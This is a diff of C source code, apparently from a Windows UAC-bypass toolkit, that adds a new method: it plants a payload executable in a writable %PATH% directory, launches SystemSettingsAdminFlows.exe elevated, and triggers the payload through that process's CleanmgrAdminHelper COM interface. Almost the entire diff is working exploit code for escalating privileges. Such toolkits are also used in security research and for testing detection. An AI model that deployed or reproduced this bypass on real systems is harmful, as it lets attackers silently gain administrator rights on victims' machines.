@@ -6,7 +6,7 @@
 *
 *  VERSION:     3.70
 *
-*  DATE:        07 May 2026
+*  DATE:        19 May 2026
 *
 *  Hybrid UAC bypass methods.
 *
@@ -1692,6 +1692,191 @@ NTSTATUS ucmQuickAssistMethod(
         _strcat(szPayloadPath, WEBVIEW_DIR);
         supRemoveDirectoryRecursive(szPayloadPath);
     }
+
+    return MethodResult;
+}
+
+typedef struct _SUPX_PAYLOAD {
+    PVOID ProxyDll;
+    DWORD ProxyDllSize;
+    NTSTATUS Result;
+    LPWSTR TargetFileName;
+} SUPX_PAYLOAD, * PSUPX_PAYLOAD;
+
+/*
+* ucmxCleanMgrAdminEnumPath
+*
+* Purpose:
+*
+* Specific callback used by ucmCleanMgrAdminMethod to store payload
+* in a first writable %PATH% location.
+*
+*/
+BOOLEAN CALLBACK ucmxCleanMgrAdminEnumPath(
+    _In_ LPCWSTR PathEntry,
+    _In_opt_ PVOID Context
+)
+{
+    BOOLEAN bResult = TRUE; //enumerate next
+    PSUPX_PAYLOAD pPayload = (PSUPX_PAYLOAD)Context;
+    LPWSTR targetFileName;
+    SIZE_T cbFileName;
+
+    if (pPayload == NULL)
+        return FALSE;
+
+    cbFileName = (MAX_PATH + _strlen(PathEntry)) * sizeof(WCHAR); //give enough space
+
+    targetFileName = (LPWSTR)supHeapAlloc(cbFileName);
+    if (targetFileName) {
+
+        _strcpy(targetFileName, PathEntry);
+        supConcatenatePaths(targetFileName, ACTIVE_EXE, MAX_PATH);
+
+        if (supWriteBufferToFile(targetFileName, pPayload->ProxyDll, pPayload->ProxyDllSize)) {
+            pPayload->Result = STATUS_SUCCESS;
+            pPayload->TargetFileName = targetFileName;
+            bResult = FALSE; // stop on success
+        }
+
+        if (bResult) 
+            supHeapFree(targetFileName);
+    }
+
+    return bResult;
+}
+
+/*
+* ucmCleanMgrAdminMethod
+*
+* Purpose:
+*
+* Bypass UAC by planting a payload into writetable %PATH% directory and
+* calling it through elevated COM server interface of SystemSettingsAdminFlows.exe
+* https://mp.weixin.qq.com/s/D_Hchnzlv18naeJrYVJi1A
+*
+*/
+NTSTATUS ucmCleanMgrAdminMethod(
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize
+)
+{
+    HRESULT hr_init, hr;
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
+    ULONGLONG count = 0;
+    IUnknown* pUnknown = NULL;
+    UICleanmgrAdminHelper* pAdminHelper = NULL;
+    UICleanmgrHelper* pHelper = NULL;
+    SHELLEXECUTEINFO shinfo;
+    SUPX_PAYLOAD payloadData;
+    WCHAR szBuffer[MAX_PATH * 2];
+
+    hr_init = CoInitializeEx(NULL, COINIT_MULTITHREADED);
+
+    payloadData.ProxyDll = ProxyDll;
+    payloadData.ProxyDllSize = ProxyDllSize;
+    payloadData.Result = STATUS_UNSUCCESSFUL;
+    payloadData.TargetFileName = NULL;
+
+    do {       
+        //
+        // Convert Fubuki into payload exe.
+        //
+        if (!supReplaceDllEntryPoint(
+            ProxyDll,
+            ProxyDllSize,
+            FUBUKI_DEFAULT_ENTRYPOINT,
+            TRUE))
+        {
+            break;
+        }
+
+        //
+        // Check whenever target is running. If not - start it elevated.
+        //
+        if (!supIsProcessRunning(SYSTEMADMFLOWS_EXE)) {
+
+            _strcpy(szBuffer, g_ctx->szSystemDirectory);
+            _strcat(szBuffer, SYSTEMADMFLOWS_EXE);
+
+            RtlSecureZeroMemory(&shinfo, sizeof(shinfo));
+            shinfo.cbSize = sizeof(shinfo);
+            shinfo.lpVerb = RUNAS_VERB;
+            shinfo.lpFile = szBuffer;
+            shinfo.lpParameters = L"CleanmgrAdminHelper";
+            shinfo.nShow = SW_HIDE;
+            shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
+            if (!ShellExecuteEx(&shinfo)) {
+                break;
+            }
+
+            //
+            // Wait enough time for server to initialize.
+            //
+            WaitForInputIdle(shinfo.hProcess, 30000);
+            Sleep(2000);
+            NtClose(shinfo.hProcess);
+        }
+
+        //
+        // Drop payload as Action.exe into first writable %PATH% directory.
+        //
+        supEnumPathEnvironmentVariable(ucmxCleanMgrAdminEnumPath, &payloadData);
+        if (!NT_SUCCESS(payloadData.Result))
+            break;
+
+        //
+        // Allocate AdminHelper and CleanmgrHelper interfaces and run payload.
+        //
+        hr = CoCreateInstance(&CLSID_SystemSettingsAdminFlows, NULL, CLSCTX_LOCAL_SERVER, &IID_IUnknown,
+            (LPVOID*)&pUnknown);
+
+        HRESULT_BREAK_ON_FAILED_CHECK_PTR(hr, pUnknown);
+
+        // Target classes are inside SettingsHandlers_StorageSense.dll
+        hr = pUnknown->lpVtbl->QueryInterface(pUnknown, &IID_UICleanmgrAdminHelper, (void**)&pAdminHelper);
+        pUnknown->lpVtbl->Release(pUnknown);
+
+        HRESULT_BREAK_ON_FAILED_CHECK_PTR(hr, pAdminHelper);
+
+        hr = pAdminHelper->lpVtbl->CreateCleanmgrHelper(pAdminHelper, &pHelper);
+        HRESULT_BREAK_ON_FAILED_CHECK_PTR(hr, pHelper);
+
+        // Initialize cleanup sequence.
+        hr = pHelper->lpVtbl->Initialize(pHelper, L"C:");
+        if (SUCCEEDED(hr)) {
+            // Query helper count.
+            pHelper->lpVtbl->GetCount(pHelper, &count);
+            if (count > 0) {
+                // Run payload.
+                hr = pHelper->lpVtbl->Purge(pHelper, 0, 0);
+            }
+        }
+
+        MethodResult = STATUS_SUCCESS;
+
+    } while (FALSE);
+
+    //
+    // Cleanup.
+    //
+    if (pHelper) {
+        pHelper->lpVtbl->Release(pHelper);
+    }
+
+    if (pAdminHelper) {
+        pAdminHelper->lpVtbl->Release(pAdminHelper);
+    }
+
+    if (payloadData.TargetFileName) {
+        DeleteFile(payloadData.TargetFileName);
+        supHeapFree(payloadData.TargetFileName);
+    }
+
+    supSetGlobalCompletionEvent();
+
+    if (SUCCEEDED(hr_init))
+        CoUninitialize();
 
     return MethodResult;
 }
